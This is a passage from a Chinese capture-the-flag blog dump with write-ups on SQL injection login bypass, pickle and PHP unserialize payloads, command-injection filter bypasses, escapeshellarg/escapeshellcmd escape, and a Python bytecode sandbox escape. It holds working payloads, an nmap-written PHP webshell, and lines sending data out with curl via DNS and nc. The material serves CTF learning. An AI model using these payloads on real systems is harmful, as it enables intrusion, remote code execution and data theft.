target(&quot;xxx&quot;)import typescode = a.__code__.co_code.encode(&#x27;hex&#x27;)print code EXP 12345newcode = type(flag.__code__)code = &quot;8800006401006b030072140088000047486e000064000053&quot;.decode(&#x27;hex&#x27;)code = newcode(0,0,2,19,code,(None, &#x27;&#x27;),(),(),&quot;example2.py&quot;,&quot;printflag&quot;,2,&quot;&quot;,(&#x27;flag&#x27;,),())flag.__code__ = codeflag() 1234&gt; ➜ python example2exp.py&gt; 8800006401006b030072140088000047486e000064000053&gt; ➜ python example2.py &gt; flag&#123;*******&#125; 谷谷点程序 » 使用OpCode绕过Python沙箱的方法详解"},{"title":"高校战疫2020","date":"2020-03-11","updated":"2024-03-19","path":"2020/03/11/高校战疫2020/","text":"Web sqlchenkin 1234567891011121314 &lt;?php // ... $pdo = new PDO(&#x27;mysql:host=localhost;dbname=test;charset=utf8;&#x27;, &#x27;root&#x27;, &#x27;&#x27;); $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); $stmt = $pdo-&gt;prepare(&quot;SELECT username from user where username=&#x27;$&#123;_POST[&#x27;username&#x27;]&#125;&#x27; and password=&#x27;$&#123;_POST[&#x27;password&#x27;]&#125;&#x27;&quot;); $stmt-&gt;execute(); $result = $stmt-&gt;fetchAll(); if (count($result) &gt; 0) &#123; if ($result[0][&#x27;username&#x27;] == &#x27;admin&#x27;) &#123; include(&#x27;flag.php&#x27;); exit(); &#125; &#125;?&gt; fuzz一下发现有waf,or , 空格 ,...不能用，但是 ' , &amp;可用，题目要求查询结果的第一个username字段为admin,，可构造类型转换绕过 password 比较。如，构 造弱类型运算使得 and 后面为 1，从而绕过 password： 12345678910MariaDB [test]&gt; select username from user where username=&#x27;admin&#x27; and password=&#x27;1&#x27;&amp;&#x27;1&#x27;;Empty set, 1 warning (0.000 sec)MariaDB [test]&gt; select username from user where username=&#x27;admin&#x27; and password=&#x27;1&#x27;&amp;&#x27;0&#x27;;+----------+| username |+----------+| admin |+----------+1 row in set, 1 warning (0.000 sec) payload如下: 123username=admin&amp;password=&#x27;&amp;0&amp;&#x27;1url编码username=admin&amp;password=&#x27;%260%26&#x27;1 这里%26编码后用浏览器提交是没有效果的，要用burpsuite提交 官方payload username=admin’and(1-&amp;password=)-’ 或者使 password 查询条件为整数 0，绕过字符串比较 SELECT username from user where username='admin'and(1-'and password=')-' 1234567MariaDB [test]&gt; select username from user where username=&#x27;admin&#x27;and(1-&#x27; and password=&#x27;)-&#x27;&#x27;;+----------+| username |+----------+| admin |+----------+1 row in set, 10 warnings (0.000 sec) Webtmp 分析 考点是pickle反序列化，过滤掉了 R 指令码，并且重写了 find_class： 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == &#x27;__main__&#x27;: return getattr(sys.modules[&#x27;__main__&#x27;], name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name)) 这就禁止引用除了 __main__ 之外的其他module，但是如果通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改 于是可以先引入__main__.secret这个module，然后把一个 dict 压入栈，内容是 &#123;'name': 'xx', 'category': 'yyy'&#125;,之后执行 build指令，改写 __main__.secret.name 和 __main__.secret.category,此时 secret.name和 secret.category 已经变成我们想要的内容 之后再压入一个正常的 Animal对象，name和category分别是 xx和yyy最后构造的pickle数据如下 b&quot;\\x80\\x03c__main__\\nsecret\\n&#125;(Vname\\nVxx\\nVcategory\\nVyyy\\nub0c__main__\\nAnimal\\n)\\x81&#125;(S'name'\\nS'xx'\\nS'category'\\nS'yyy'\\nub.&quot; MARK = b’(’ # push special markobject on stack 代表一个元组的开始 EMPTY_DICT = b’}’ # push empty dict UNICODE = b’V’ # push Unicode string; raw-unicode-escaped’d argument SETITEMS = b’u’ # modify dict by adding topmost key+value pairs u操作符。它干这样的事情： 调用pop_mark。也就是说，把当前栈的内容扔进一个数组arr，然后把当前栈恢复到MARK时的状态。 执行完成之后，arr=['name', 'rxz', 'grade', 'G2']；当前栈里面存的是__main__.Student这个类、一个空的dict 拿到当前栈的末尾元素，规定必须是一个dict。 这里，读到了栈顶那个空dict。 两个一组地读arr里面的元素，前者作为key，后者作为value，存进上一条所述的dict。 STRING = b’S’ # push string; NL-terminated string argument BUILD = b’b’ # call setstate or dict.update() ​ x81操作符。它的作用是：从栈中先弹出一个元素，记为args；再弹出一个元素，记为cls。接下来，执行cls.__new__(cls, *args) ，然后把得到的东西压进栈。说人话，那就是：从栈中弹出一个参数和一个class，然后利用这个参数实例化class，把得到的实例压进栈。 编码为base64提交即可 gANjX19tYWluX18Kc2VjcmV0Cn0oVm5hbWUKVnh4ClZjYXRlZ29yeQpWeXl5CnViMGNfX21haW5fXwpBbmltYWwKKYF9KFMnbmFtZScKUyd4eCcKUydjYXRlZ29yeScKUyd5eXknCnViLg=="},{"title":"命令执行Bypass","date":"2020-03-11","updated":"2024-03-19","path":"2020/03/11/命令执行Bypass/","text":"举例，ping命令判断存活主机 123456ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 ||result=1 if [ &quot;$result&quot; == 0 ];then echo &quot;192.168.1.1 is UP!&quot; else echo &quot;192.168.2.1 is DOWN!&quot; fi 注意 &amp;&gt;要连起来写。 linux下 命令执行变量拼接 1/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 过滤bash用sh执行 1echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 内联执行 将反引号内命令的输出作为输入执行 1?ip=127.0.0.1;cat$IFS$9`ls` 空格绕过 12345678$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行&lt; &lt;&gt; &#123;cat,flag.php&#125; //用逗号实现了空格功能%20 %09 1234567&#123;cat,flag.txt&#125;cat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txtkg=$&#x27;\\x20flag.txt&#x27;&amp;&amp;cat$kg(\\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过) 通配符绕过 ？？？在linux里面可以进行代替字母 /???/c?t flag.txt 第三种是利用DNS管道解析 这里提供一个在线网址，可以直接进行给一个利用网址：admin.dnslog.link注册一个账号后会分配一个子域名可以利用 1|curl `whoami`.xxxx.xxx(子域名) 这样就会在利用网址看到反弹结果。（这里也不演示了，账号忘记了。。。）这里解释一下\\whoami\\因为`反引号在linux下是执行命令的特殊符号，原理请见：http://mp.weixin.qq.com/s/jwqWnP0FHhMoR5b6iCS6NQ nc外带数据 本地监听端口 nc -lvp 9999 命令执行出 ping 127.0.0.0 &amp; nc ip port &gt; key.php 网络地址转化为数字地址 网络地址有另外一种表示形式，就是数字地址比如127.0.0.1可以转化为2130706433 可以直接访问 1http://2130706433 或者 1http://0x7F000001 这样就可以绕过.的ip过滤，这里给个转化网址：http://www.msxindl.com/tools/ip/ip_num.asp 123%0acat%09%0Acat$IFS$9%0acat&lt; 注释符 1通过查看文件的权限 chmod +777赋予权限l&#x27;s&#x27; -lac&#x27;h&#x27;m&#x27;o&#x27;d +777 /filename 花式绕过 cat:由第一行开始显示内容，并将所有内容输出 tac:从最后一行倒序显示内容，并将所有内容输出 more:根据窗口大小，一页一页的现实文件内容 less:和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head:只显示头几行 tail:只显示最后几行 nl:类似于cat -n，显示时输出行号 tailf:类似于tail -f Linux花式读取文件内容 ps:目标是获取flag.txt的内容 static-sh读取文件： static-sh ./flag.txt #输出结果： ./flag.txt: line 1: flag{this_is_a_test}: not found paste读取文件: paste ./flag.txt /etc/passwd #输出结果： flag{this_is_a_test} root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync diff读取文件 : diff ./flag.txt /etc/passwd #输出结果： 1c1,45 &lt; flag{this_is_a_test} \\ No newline at end of file root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync od读取文件 od -a ./flag.txt #输出结果： 0000000 f l a g { t h i s _ i s _ a _ t 0000020 e s t } 0000024 bzmore读取文件: bzmore ./flag.txt #输出结果： ------&gt; ./flag.txt &lt;------ flag{this_is_a_test} bzless读取文件： bzless ./flag.txt echo bzless ./flag.txt #输出结果： ------&gt; ./flag.txt &lt;------ flag{this_is_a_test} curl读取文件： curl file:///home/coffee/flag nc 传输文件 靶机： nc 10.10.10.10 4444 &lt; /var/www/html/key.php 接受机： nc -l 4444 &gt; key.txt wget wget url -P path"},{"title":"GXYCTF2019","date":"2020-03-10","updated":"2024-03-19","path":"2020/03/10/GXYCTF2019/","text":"Ping Ping Ping 页面显示?ip=,传入ip参数为12,则显示 ping 0.0.0.12应该是命令执行绕过 输入ip=12;ls返回目录下有index.php flag.php fuzz一下，过滤了{},flag,‘’,“”,空格等等，但是$ |号没有过滤，在bash中${IFS}代表换行符 12 ⚡ root@kali echo $&#123;IFS&#125;|base64IAkKAAo= 输入?ip=12;cat$IFS\\index.php返回了index.php的内容，但是显示不全，所以base64编码一下在输出 ?ip=12;cat$IFS\\index.php|base64 1234567891011121314151617181920解码后:/?ip=&lt;?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);&#125;?&gt; 绕过空格的方法大概有以下几种： 12345678$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行&lt; &lt;&gt; &#123;cat,flag.php&#125; //用逗号实现了空格功能%20 %09 三种手法 命令执行变量拼接 1/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php 过滤bash用sh执行 1echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 内联执行 将反引号内命令的输出作为输入执行 1?ip=127.0.0.1;cat$IFS$9`ls` ASCII码对照表 Bin (二进制) Oct (八进制) Dec (十进制) Hex (十六进制) 缩写/字符 解释 0000 0000 00 0 0x00 NUL(null) 空字符 0000 0001 01 1 0x01 SOH(start of headline) 标题开始 0000 0010 02 2 0x02 STX (start of text) 正文开始 0000 0011 03 3 0x03 ETX (end of text) 正文结束 0000 0100 04 4 0x04 EOT (end of transmission) 传输结束 0000 0101 05 5 0x05 ENQ (enquiry) 请求 0000 0110 06 6 0x06 ACK (acknowledge) 收到通知 0000 0111 07 7 0x07 BEL (bell) 响铃 0000 1000 010 8 0x08 BS (backspace) 退格 0000 1001 011 9 0x09 HT (horizontal tab) 水平制表符 0000 1010 012 10 0x0A LF (NL line feed, new line) 换行键 0000 1011 013 11 0x0B VT (vertical tab) 垂直制表符 0000 1100 014 12 0x0C FF (NP form feed, new page) 换页键 0000 1101 015 13 0x0D CR (carriage return) 回车键 0000 1110 016 14 0x0E SO (shift out) 不用切换 0000 1111 017 15 0x0F SI (shift in) 启用切换 0001 0000 020 16 0x10 DLE (data link escape) 数据链路转义 0001 0001 021 17 0x11 DC1 (device control 1) 设备控制1 0001 0010 022 18 0x12 DC2 (device control 2) 设备控制2 0001 0011 023 19 0x13 DC3 (device control 3) 设备控制3 0001 0100 024 20 0x14 DC4 (device control 4) 设备控制4 0001 0101 025 21 0x15 NAK (negative acknowledge) 拒绝接收 0001 0110 026 22 0x16 SYN (synchronous idle) 同步空闲 0001 0111 027 23 0x17 ETB (end of trans. block) 结束传输块 0001 1000 030 24 0x18 CAN (cancel) 取消 0001 1001 031 25 0x19 EM (end of medium) 媒介结束 0001 1010 032 26 0x1A SUB (substitute) 代替 0001 1011 033 27 0x1B ESC (escape) 换码(溢出) 0001 1100 034 28 0x1C FS (file separator) 文件分隔符 0001 1101 035 29 0x1D GS (group separator) 分组符 0001 1110 036 30 0x1E RS (record separator) 记录分隔符 0001 1111 037 31 0x1F US (unit separator) 单元分隔符 0010 0000 040 32 0x20 (space) 空格 0010 0001 041 33 0x21 ! 叹号 0010 0010 042 34 0x22 &quot; 双引号 0010 0011 043 35 0x23 # 井号 0010 0100 044 36 0x24 $ 美元符 0010 0101 045 37 0x25 % 百分号 0010 0110 046 38 0x26 &amp; 和号 0010 0111 047 39 0x27 ’ 闭单引号 0010 1000 050 40 0x28 ( 开括号 0010 1001 051 41 0x29 ) 闭括号 0010 1010 052 42 0x2A * 星号 0010 1011 053 43 0x2B + 加号 0010 1100 054 44 0x2C , 逗号 0010 1101 055 45 0x2D - 减号/破折号 0010 1110 056 46 0x2E . 句号 0010 1111 057 47 0x2F / 斜杠 0011 0000 060 48 0x30 0 字符0 0011 0001 061 49 0x31 1 字符1 0011 0010 062 50 0x32 2 字符2 0011 0011 063 51 0x33 3 字符3 0011 0100 064 52 0x34 4 字符4 0011 0101 065 53 0x35 5 字符5 0011 0110 066 54 0x36 6 字符6 0011 0111 067 55 0x37 7 字符7 0011 1000 070 56 0x38 8 字符8 0011 1001 071 57 0x39 9 字符9 0011 1010 072 58 0x3A : 冒号 0011 1011 073 59 0x3B ; 分号 0011 1100 074 60 0x3C &lt; 小于 0011 1101 075 61 0x3D = 等号 0011 1110 076 62 0x3E &gt; 大于 0011 1111 077 63 0x3F ? 问号 0100 0000 0100 64 0x40 @ 电子邮件符号 0100 0001 0101 65 0x41 A 大写字母A 0100 0010 0102 66 0x42 B 大写字母B 0100 0011 0103 67 0x43 C 大写字母C 0100 0100 0104 68 0x44 D 大写字母D 0100 0101 0105 69 0x45 E 大写字母E 0100 0110 0106 70 0x46 F 大写字母F 0100 0111 0107 71 0x47 G 大写字母G 0100 1000 0110 72 0x48 H 大写字母H 0100 1001 0111 73 0x49 I 大写字母I 01001010 0112 74 0x4A J 大写字母J 0100 1011 0113 75 0x4B K 大写字母K 0100 1100 0114 76 0x4C L 大写字母L 0100 1101 0115 77 0x4D M 大写字母M 0100 1110 0116 78 0x4E N 大写字母N 0100 1111 0117 79 0x4F O 大写字母O 0101 0000 0120 80 0x50 P 大写字母P 0101 0001 0121 81 0x51 Q 大写字母Q 0101 0010 0122 82 0x52 R 大写字母R 0101 0011 0123 83 0x53 S 大写字母S 0101 0100 0124 84 0x54 T 大写字母T 0101 0101 0125 85 0x55 U 大写字母U 0101 0110 0126 86 0x56 V 大写字母V 0101 0111 0127 87 0x57 W 大写字母W 0101 1000 0130 88 0x58 X 大写字母X 0101 1001 0131 89 0x59 Y 大写字母Y 0101 1010 0132 90 0x5A Z 大写字母Z 0101 1011 0133 91 0x5B [ 开方括号 0101 1100 0134 92 0x5C \\ 反斜杠 0101 1101 0135 93 0x5D ] 闭方括号 0101 1110 0136 94 0x5E ^ 脱字符 0101 1111 0137 95 0x5F _ 下划线 0110 0000 0140 96 0x60 ` 开单引号 0110 0001 0141 97 0x61 a 小写字母a 0110 0010 0142 98 0x62 b 小写字母b 0110 0011 0143 99 0x63 c 小写字母c 0110 0100 0144 100 0x64 d 小写字母d 0110 0101 0145 101 0x65 e 小写字母e 0110 0110 0146 102 0x66 f 小写字母f 0110 0111 0147 103 0x67 g 小写字母g 0110 1000 0150 104 0x68 h 小写字母h 0110 1001 0151 105 0x69 i 小写字母i 0110 1010 0152 106 0x6A j 小写字母j 0110 1011 0153 107 0x6B k 小写字母k 0110 1100 0154 108 0x6C l 小写字母l 0110 1101 0155 109 0x6D m 小写字母m 0110 1110 0156 110 0x6E n 小写字母n 0110 1111 0157 111 0x6F o 小写字母o 0111 0000 0160 112 0x70 p 小写字母p 0111 0001 0161 113 0x71 q 小写字母q 0111 0010 0162 114 0x72 r 小写字母r 0111 0011 0163 115 0x73 s 小写字母s 0111 0100 0164 116 0x74 t 小写字母t 0111 0101 0165 117 0x75 u 小写字母u 0111 0110 0166 118 0x76 v 小写字母v 0111 0111 0167 119 0x77 w 小写字母w 0111 1000 0170 120 0x78 x 小写字母x 0111 1001 0171 121 0x79 y 小写字母y 0111 1010 0172 122 0x7A z 小写字母z 0111 1011 0173 123 0x7B { 开花括号 0111 1100 0174 124 0x7C | 垂线 0111 1101 0175 125 0x7D } 闭花括号 0111 1110 0176 126 0x7E ~ 波浪号 0111 1111 0177 127 0x7F DEL (delete) 删除"},{"title":"escapeshellarg与escapeshellcmd造成的逃逸","date":"2020-03-10","updated":"2024-03-19","path":"2020/03/10/escapeshellarg与escapeshellcmd造成的逃逸/","text":"escapeshellcmd() escapeshellcmd()功能escapeshellcmd: escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 ​ 反斜线（\\）会在以下字符之前插入： *&amp;#;`|*?~&lt;&gt;^()[]{}$*, \\x0A 和 \\xFF。 ’ 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 **escapeshellcmd()**函数在底层代码如下（详细点 这里 https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c）： escapeshellarg() escapeshellarg()定义 escapeshellarg— 把字符串转码为可以在 shell 命令里使用的参数 功能：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号) 定义：string escapeshellarg ( string $arg ) 具体功能作用，可以参考如下案例： 函数使用不当造成的逃逸 首先简单点来说就是一个函数把危险字符给转义了，但是这个函数用的转义危险字符的字符也是危险的，所以再到另一个函数里又把这个危险字符转义了，这导致了 **escapeshellcmd()**和 escapeshellarg一起使用，会造成特殊字符逃逸，下面我们给个简单例子理解一下： 详细分析一下这个过程： 传入的参数是127.0.0.1’ -v -d a=1 由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：‘127.0.0.1’ ’ ’ -v -d a=1’ 接着 escapeshellcmd 函数对第二步处理后字符串中的 以及 a=1’ 中的单引号进行转义处理，结果如下所示：‘127.0.0.1’‘’ -v -d a=1’ 由于第三步处理之后的payload中的\\被解释成了\\\\而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示： 所以这个payload可以简化为 curl 127.0.0.1 -v -d a=1’ ，即向 127.0.0.1 发起请求，POST 数据为 a=1’ 。 总结一下，这题实际上是考察绕过 **filter_var()**函数的邮件名检测，通过 mail函数底层实现中调用的 **escapeshellcmd()**函数处理字符串，再结合 **escapeshellarg()**函数，最终实现参数逃逸，导致 远程代码执行。 PHP escapeshellarg()+escapeshellcmd() 之殇 看代码学渗透 Day5 - escapeshellarg与escapeshellcmd使用不当"},{"title":"BUUCTF2018","date":"2020-03-10","updated":"2024-03-19","path":"2020/03/10/BUUCTF2018/","text":"Online Tool RCE 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; escapeshellarg()和escapeshellcmd() 这两个函数在一起用会有些问题，参考escapeshellarg与escapeshellcmd造成的逃逸。 这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\\来转移…。 在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件 namp &lt;?php phpinfo(); ?&gt; -oG 1.php 可以写入一个文件 namp nmap &lt;?php phpinfo();&gt; -oG 1.php\\’ 会写成1.php‘ 而不是 1.php 所以可以利用这个来写一句话木马，如果我们在数据后面，加上一个单引号，所有的单引号都闭合了，那么我们在单引号后面，就可以加上我们想要执行的命令了。 这样的话，语句就变成了： nmap -T5 -sT -Pn --host-timeout 2 -F ‘1’\\‘’ shellcode' ,因为所有的单引号都被闭合了，所以可以忽略。放出paylod: '&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php ' you are in sandbox 3cbd637876b7cb201c6b151230494295Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-10 16:14 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 15.17 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 15.17 seconds 然后蚁剑连接即可"},{"title":"ZJCTF2019","date":"2020-03-10","updated":"2024-03-19","path":"2020/03/10/ZJCTF2019/","text":"NiZhuanSiWei 12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)) $text可以用php://input协议读取POST提交的原始数据内容（也可以用data伪协议传参 ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=） url/?text=php://input然后post提交welcome to the zjctf，绕过第一层 include($file); //useless.php $file提示useless.php，直接赋值useless.php是没有返回的，这里用phhp://filter伪协议编码后读取 url/?text=php://input?file=php://filter/read=convert.base64-encode/resource=useless.php 获得的内容base64解码 123456789101112&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; $password = unserialize($password); 建立Flag类，对其中的file赋值为flag.php，然后获得序列化字符串赋值给password，password反序列化后获得Flag类，echo的时侯调用tostring魔术方法将flag.php输出。 但是要注意，在的一个php文件中并没有自动包含Flag类，所以需要给file赋值为useless.php来包含进Flag类。 payload:/?text=php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;"},{"title":"0CTF2016","date":"2020-03-09","updated":"2024-03-19","path":"2020/03/09/0CTF2016/","text":"piapiapia 数组绕过正则 反序列化长度问题导致的尾部字符逃逸 顺手存一下图片~ 输入admin@admin（@表示分割姓名密码）提示Invalid user name or password 输入admin@1提示Invalid password 输入admin@asd提示Invalid user name or password 输入admin@123提示Invalid user name or password 输入sadaaaaaa@asdddd提示Invalid user name 输入username=aaaaaaaaaabbbbbbb&amp;password=21提示Invalid user name 输入username=aaaaaaaaaabbbbb&amp;password=22提示Invalid password 输入username=aaaaaaaaaabbbbbb&amp;password=211提示Invalid user name or password 貌似和长度有关系，但是没看到有啥用 扫一下目录发现 12Dir found: /register.php - 200Dir found: /www.zip - 200 原来是有注册的呀！ 下面列出关键部分的代码 跳转顺序: index.php-&gt; register.php -&gt; update.php -&gt; profile.php 中间会调用class.php进行过滤等操作 update.php 12345678910111213141516171819202122232425262728293031323334&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123; html页面 &#125; profile.php 12345678910111213141516&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); &lt;--- $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;])); &lt;--- class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;?phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; &lt;--- 过滤函数 $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = 